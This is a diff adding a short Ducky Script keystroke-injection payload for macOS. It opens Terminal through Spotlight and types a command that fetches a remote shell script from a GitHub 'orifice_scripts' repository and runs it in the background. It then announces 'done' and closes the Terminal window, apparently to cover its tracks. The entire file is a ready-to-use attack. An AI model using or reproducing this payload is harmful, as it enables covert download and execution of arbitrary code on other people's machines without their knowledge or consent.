@@ -1,0 +1,15 @@
+DELAY 1000
+GUI SPACE
+DELAY 100
+STRING terminal
+ENTER
+DELAY 200
+GUI n
+DELAY 200
+STRING sh -c "$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/go.sh)" &
+ENTER
+DELAY 5000
+STRING say done
+GUI w
+GUI q
+ENTER
